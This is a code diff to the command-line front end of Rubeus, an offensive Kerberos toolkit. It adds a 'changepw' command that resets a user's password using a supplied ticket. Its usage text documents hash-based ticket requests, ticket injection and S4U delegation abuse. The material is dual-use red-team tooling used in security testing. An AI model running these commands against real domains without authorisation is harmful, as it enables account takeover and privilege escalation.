@@ -18,7 +18,7 @@ namespace Rubeus
             System.Console.WriteLine("  |  __  /| | | |  _ \\| ___ | | | |/___)");
             System.Console.WriteLine("  | |  \\ \\| |_| | |_) ) ____| |_| |___ |");
             System.Console.WriteLine("  |_|   |_|____/|____/|_____)____/(___/\r\n");
-            System.Console.WriteLine("  v1.1.0\r\n");
+            System.Console.WriteLine("  v1.2.0\r\n");
         }
 
         public static void Usage()
@@ -28,10 +28,12 @@ namespace Rubeus
             Console.WriteLine("        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]");
             Console.WriteLine("\r\n    Retrieve a TGT based on a user hash, start a /netonly process, and to apply the ticket to the new process/logon session:");
             Console.WriteLine("        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]");
-            Console.WriteLine("\r\n    Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:");
-            Console.WriteLine("        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]");
             Console.WriteLine("\r\n    Retrieve a service ticket for one or more SPNs, optionally applying the ticket:");
             Console.WriteLine("        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]");
+            Console.WriteLine("\r\n    Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:");
+            Console.WriteLine("        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]");
+            Console.WriteLine("\r\n    Reset a user's password from a supplied TGT (AoratoPw):");
+            Console.WriteLine("        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]");
             Console.WriteLine("\r\n    Perform S4U constrained delegation abuse:");
             Console.WriteLine("        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]");
             Console.WriteLine("        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]");
@@ -137,7 +139,6 @@ namespace Rubeus
                     }
                 }
 
-
                 if (arguments.ContainsKey("/createnetonly"))
                 {
                     // if we're starting a hidden process to apply the ticket to
@@ -236,7 +237,7 @@ namespace Rubeus
                 }
                 else
                 {
-                    Console.WriteLine("\r\n[X] A base64 .kirbi file needs to be supplied for renewal!\r\n");
+                    Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied!\r\n");
                     return;
                 }
             }
@@ -298,7 +299,56 @@ namespace Rubeus
                 }
                 else
                 {
-                    Console.WriteLine("\r\n[X] A base64 .kirbi file needs to be supplied for renewal!\r\n");
+                    Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied!\r\n");
+                    return;
+                }
+            }
+
+            else if (arguments.ContainsKey("changepw"))
+            {
+                string newPassword = "";
+                string dc = "";
+
+                if (arguments.ContainsKey("/new"))
+                {
+                    newPassword = arguments["/new"];
+                }
+                if (String.IsNullOrEmpty(newPassword))
+                {
+                    Console.WriteLine("\r\n[X] New password must be supplied with /new:X !\r\n");
+                    return;
+                }
+
+                if (arguments.ContainsKey("/dc"))
+                {
+                    dc = arguments["/dc"];
+                }
+
+                if (arguments.ContainsKey("/ticket"))
+                {
+                    string kirbi64 = arguments["/ticket"];
+
+                    if (Helpers.IsBase64String(kirbi64))
+                    {
+                        byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
+                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
+                        Reset.UserPassword(kirbi, newPassword, dc);
+                    }
+                    else if (File.Exists(kirbi64))
+                    {
+                        byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
+                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
+                        Reset.UserPassword(kirbi, newPassword, dc);
+                    }
+                    else
+                    {
+                        Console.WriteLine("\r\n[X]/ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
+                    }
+                    return;
+                }
+                else
+                {
+                    Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied!\r\n");
                     return;
                 }
             }
@@ -406,7 +456,7 @@ namespace Rubeus
                 }
                 else
                 {
-                    Console.WriteLine("\r\n[X] A base64 .kirbi file needs to be supplied for S4U!");
+                    Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied for S4U!\r\n");
                     Console.WriteLine("[X] Alternatively, supply a /user and </rc4:X | /aes256:X> hash to first retrieve a TGT.\r\n");
                     return;
                 }
@@ -457,7 +507,7 @@ namespace Rubeus
                 }
                 else
                 {
-                    Console.WriteLine("\r\n[X] A base64 .kirbi file needs to be supplied!\r\n");
+                    Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied!\r\n");
                     return;
                 }
             }
@@ -561,7 +611,6 @@ namespace Rubeus
                     format = arguments["/format"];
                 }
 
-
                 if (String.IsNullOrEmpty(user))
                 {
                     Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
@@ -624,11 +673,11 @@ namespace Rubeus
             {
                 if (arguments.ContainsKey("/target"))
                 {
-                    LSA.RequestFakeDelegTicket(arguments["/target"]);
+                    byte[] blah = LSA.RequestFakeDelegTicket(arguments["/target"]);
                 }
                 else
                 {
-                    LSA.RequestFakeDelegTicket();
+                    byte[] blah = LSA.RequestFakeDelegTicket();
                 }
             }
 
@@ -683,7 +732,7 @@ namespace Rubeus
                 }
                 else
                 {
-                    Console.WriteLine("\r\n[X] A base64 .kirbi /ticket file needs to be supplied!\r\n");
+                    Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied!\r\n");
                     return;
                 }
             }
